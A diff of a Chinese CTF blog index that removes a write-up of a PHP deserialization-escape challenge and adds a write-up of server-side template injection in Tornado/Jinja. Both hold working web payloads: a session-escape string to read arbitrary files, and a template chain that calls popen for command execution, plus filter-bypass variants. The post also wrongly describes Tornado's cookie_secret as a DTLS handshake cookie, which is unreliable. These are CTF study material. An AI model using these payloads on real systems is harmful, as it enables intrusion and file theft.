@@ -169,77 +169,6 @@
 </nav>
       <div class="body-wrap">
   
-    <article id="post-安洵杯2019serilaze" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/" class="article-date">
-  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/07/17/%E5%AE%89%E6%B4%B5%E6%9D%AF2019serilaze/">
-        安洵杯2019serilaze
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="安洵杯 2019]easy_serialize_php"></a>安洵杯 2019]easy_serialize_php</h1><p>代码审计</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function = @$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">function filter($img)&#123;</span><br><span class="line">    $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;);</span><br><span class="line">    $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;;</span><br><span class="line">    return preg_replace($filter,&#x27;&#x27;,$img);</span><br><span class="line">&#125; #对$img里面的php,flag,php5,php4,fl1g进行过滤</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if($_SESSION)&#123;</span><br><span class="line">    unset($_SESSION);</span><br><span class="line">&#125; #将已有的session删除掉</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;] = $function; #给名为user和function的session赋值</span><br><span class="line"></span><br><span class="line">extract($_POST); #用POST提交的方式叫html表单</span><br><span class="line"></span><br><span class="line">if(!$function)&#123;</span><br><span class="line">    echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!$_GET[&#x27;img_path&#x27;])&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));</span><br><span class="line">&#125; #如果没有img_path这个变量，则给guset_img.png加密，有，则给img_path加密</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION)); #将$_SESSION序列化的值给filter过滤</span><br><span class="line"></span><br><span class="line">if($function == &#x27;highlight_file&#x27;)&#123;</span><br><span class="line">    highlight_file(&#x27;index.php&#x27;);</span><br><span class="line">&#125; #如果变量是highlight_file，则显示index.php</span><br><span class="line">else if($function == &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">    eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!</span><br><span class="line">&#125; #如果变量是phpinfo，则显示php信息</span><br><span class="line">else if($function == &#x27;show_image&#x27;)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;])); #如果变量是show_image，则显示$img变量里的文件里的内容</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>通过观察php的信息，可以看到一个文件信息d0g3_flag.php</p>
-<p>但是我们无法读取这个文件的内容，然后通过代码审计，我们可以使用反序列化逃逸，通过改变img的值来读取</p>
-<p>可以通过exp来知道原来_SESSION序列化的值</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$function=@$_GET[&#x27;f&#x27;];</span><br><span class="line"></span><br><span class="line">$_SESSION[&quot;user&quot;]=&#x27;guest&#x27;;</span><br><span class="line">$_SESSION[&#x27;function&#x27;]=$function;</span><br><span class="line">$_SESSION[&#x27;img&#x27;]=base64_encode(&#x27;guest_img.png&#x27;);</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line">$serialize_info=serialize($_SESSION);</span><br><span class="line"></span><br><span class="line">echo $serialize_info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>此时输出的是：<br>a:3:{s:4:”user”;s:5:”guest”;s:8:”function”;N;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}</p>
-<p>我们可以通过减少关键词的数来逃逸<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}</p>
-<p>我们可以得到<br>$flag = ‘flag in /d0g3_fllllllag’;</p>
-<p>然后我们再改变一下img的数值<br>_SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;}</p>
-<p>从而得到flag<br>flag{7b704900-c0d7-4302-90a6-fc459a2c405c} </p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
     <article id="post-对iv进行修复" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -920,6 +849,108 @@ echo serialize($a);
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-[护网杯 2018]easy_tornado(ssti模板注入和tornado模板注入）" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/" class="article-date">
+  	<time datetime="2021-07-16T16:00:00.000Z" itemprop="datePublished">2021-07-17</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/17/%5B%E6%8A%A4%E7%BD%91%E6%9D%AF%202018%5Deasy_tornado(ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%92%8Ctornado%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89/">
+        easy_tornado(ssti模板注入和tornado模板注入）
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ssti模板注入和tornado模板注入"><a href="#ssti模板注入和tornado模板注入" class="headerlink" title="ssti模板注入和tornado模板注入"></a>ssti模板注入和tornado模板注入</h1><h2 id="ssti模板和tornado模板注入"><a href="#ssti模板和tornado模板注入" class="headerlink" title="ssti模板和tornado模板注入"></a>ssti模板和tornado模板注入</h2><p>产生模板注入的原因：是因为没有对用户的输入进行相应的检查，过分相信用户的输入导致的，由于在ssti模板和tornado模板中存在render渲染函数和 template渲染函数，因此当用户输入信息时<br>                                render函数和 template函数对输入的信息进行执行，并将结果渲染回页面，此时用户的输入是可控的，而且也没有对输入的信息进行审计，导致可能会出现一些恶意的代码。</p>
+<h3 id="render函数和-template函数"><a href="#render函数和-template函数" class="headerlink" title="render函数和 template函数"></a>render函数和 template函数</h3><p>对里面的信息进行渲染和返回页面</p>
+<p>模板中可能的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">render($_GET[&#x27;msg&#x27;])</span><br><span class="line"></span><br><span class="line">template($_GET[&#x27;msg&#x27;])</span><br></pre></td></tr></table></figure>
+<p>对输入的信息进行执行并渲染回页面</p>
+<h3 id="用户输入恶意信息的格式："><a href="#用户输入恶意信息的格式：" class="headerlink" title="用户输入恶意信息的格式："></a>用户输入恶意信息的格式：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;.......&#125;&#125;装载一个变量</span><br><span class="line"></span><br><span class="line">&#123;%......%&#125;装载一个控制语句</span><br><span class="line"></span><br><span class="line">&#123;#.......#&#125;渲染时，注释中间的内容</span><br></pre></td></tr></table></figure>
+
+<h2 id="对ssti模板中类的调用"><a href="#对ssti模板中类的调用" class="headerlink" title="对ssti模板中类的调用"></a>对ssti模板中类的调用</h2><p>用空格来知道并调用我们需要的类</p>
+<p>查找模板中的类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类，一般为object类，有时不止一个基类，可以使用mro来显示所有基类，bases也可以显示所有基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _mro_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类的子类的集合，[0]是所有基类中的第一个基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找模板类中的基类的子类的初始类，并用globals全局来查找所有的方法及变量及参数，()[118]是在模板类中的基类的第119个子类，<a href="'dir'">‘popen’</a>是调用模板类中的基类的第119个子类的初始类的function popen中的dir来打开文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27; &#x27;._ _class_ _._ _bases_ _[0]._ _subclasse_ _()[118]._ _init_ _._ _globals_ _[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[118].__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()&#125;&#125;  //打开文件并读取</span><br></pre></td></tr></table></figure>
+
+<h2 id="模板注入可能有些过滤的绕过方法"><a href="#模板注入可能有些过滤的绕过方法" class="headerlink" title="模板注入可能有些过滤的绕过方法"></a>模板注入可能有些过滤的绕过方法</h2><h3 id="绕过-过滤"><a href="#绕过-过滤" class="headerlink" title="绕过[]过滤"></a>绕过[]过滤</h3><p>使用gititem绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc &#123;&#123;&quot;&quot;.class.bases[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.class.bases.getitem(0)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤了subclasses，拼凑法"><a href="#过滤了subclasses，拼凑法" class="headerlink" title="过滤了subclasses，拼凑法"></a>过滤了subclasses，拼凑法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">原poc&#123;&#123;&quot;&quot;.class.bases[0].subclasses()&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过 &#123;&#123;&quot;&quot;.class.bases[0]&#x27;subcla&#x27;+&#x27;sses&#x27;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="过滤了class"><a href="#过滤了class" class="headerlink" title="过滤了class"></a>过滤了class</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;session[&#x27;__cla&#x27;+&#x27;ss__&#x27;].__mro__[12]&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><p>tornado模板注入和以上ssti模板注入类似，不过tornado模板中，存在一些可以快速访问的对象，例如：handler.settings(环境变量)</p>
+<p>而cookie_secret就在handler.settings中</p>
+<h2 id="cookie-secret"><a href="#cookie-secret" class="headerlink" title="cookie_secret"></a>cookie_secret</h2><p>是在DTLS握手过程中的生成和需要验证的cookie值</p>
+<p>DTLS协议是对广播发送UDP报文的加密，且可以防止中断攻击，以为在建立握手时，客户端会发送client-hello请求，此时服务器会生成一个cookie值放在Hello-Verify-Request报文中，<br>此时客户端收到后需将收到的cookie值放到client-hello中，并再发送给服务器，服务器收到后对比cookie值，相同才分配资源。</p>
+<h2 id="实例（tornado模板注入）"><a href="#实例（tornado模板注入）" class="headerlink" title="实例（tornado模板注入）"></a>实例（tornado模板注入）</h2><p>打开网页后看到三个文件，分别时flag.txt、welcome.txt和hint.txt，各自打开文件，发现payload有filename&amp;filehash的get的提交方式，有此可知，需要这两个变量都满足变量才能显示文件的内容</p>
+<p>而打开三个文件后发现flag在/flllllllllllag文件下，且有render渲染函数，且知道了filehash的加密方式</p>
+<p>此时需要我们找到cookie_secret值，此时我们在filename中输入flllllllllllag，发现报错，且payload为/error?msg=error，因此我们可以使用tornado模板中，存在一些可以快速访问的对象的特性，来构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时我们得到cookie_secret的值</p>
+<p>然后我们构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo md5(&#x27;f03d04f0-456b-4577-b431-bd29fd3292d2&#x27;.md5(&quot;/fllllllllllllag&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得出fliehash值后代入即可得到flag</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" rel="tag">模板注入</a></li></ul>
 	</div>
 
       
